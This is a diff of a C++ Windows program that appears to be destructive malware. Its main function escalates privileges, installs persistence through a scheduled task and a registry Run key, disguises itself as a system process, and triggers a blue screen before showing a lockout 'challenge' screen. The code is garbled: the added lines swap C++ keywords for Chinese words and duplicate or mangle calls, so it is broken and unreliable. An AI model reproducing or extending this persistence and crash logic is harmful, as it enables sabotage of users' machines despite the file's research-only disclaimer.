@@ -1,4 +1,4 @@
-// 文件名: dad.cpp
+// 文件名: dad_challenge_plus.cpp
 // 编译器: MSVC (Visual Studio 2019/2022)
 // 项目设置: 字符集 Unicode, 控制台程序, 附加依赖项: taskschd.lib comsuppw.lib
 // 警告: 仅供安全研究和教育目的，禁止用于非法或未授权系统。
@@ -576,7 +576,7 @@ void ShowChallengeUI() {
 // ---------- 主函数 ----------
 int wmain(int argc, wchar_t* argv[]) {
     // 解析命令行参数
-bool silent = false;
+    bool silent = false;
     bool nohide = false;
     bool respawn = false;
     for (int i = 1; i < argc; i++) {
@@ -603,11 +603,11 @@ bool silent = false;
     }
 
     // 以管理员权限运行后的核心初始化
-takeAllPrivileges();
+    takeAllPrivileges();
 
     // 安装持久化（计划任务 + 注册表Run）
-InstallScheduledTask();
-SetupRegistryRun();
+    InstallScheduledTask();
+    SetupRegistryRun();
 
     // 伪装系统进程
 disguiseAsSystemProcess();
@@ -633,28 +633,28 @@ disguiseAsSystemProcess();
     int lastSafe = ReadSafeStatus();
     if (lastSafe == 0) {
         // 上次非安全退出，立即蓝屏
-        writeDeathNote();
-        Sleep(500);
-        triggerBSOD();
-当 (1) Sleep(1000);
-}
+写死亡笔记();();
+睡眠(500);Sleep(500);
+触发蓝屏();();
+        当 (1） 睡眠(1000);
+    }
     // 标记本次尚未安全退出
-WriteSafeStatus(false);
+    写入安全状态(false);
 
     // 执行挑战逻辑
-if (!silent) {
+    如果 (!silent) {
         // 显示控制台以进行交互
-if (!nohide) HideConsole(false);
-ShowChallengeUI();
+        如果 (!nohide) 隐藏控制台(false）;
+        显示挑战界面(）;
     }
     else {
         // 静默模式：仍然需要挑战，但不弹出窗口？为了隐蔽，可写入日志或定时检测
         // 简单起见，静默模式下也显示控制台，但用户可能不知道
-        if (!nohide) HideConsole(false);
-        ShowChallengeUI();
+        if (!nohide) 隐藏控制台(false);
+        显示挑战界面();
     }
 
     // 理论上不会执行到这里
-    safeExit();
-返回 0;
+    安全退出();
+    返回 0;
 }
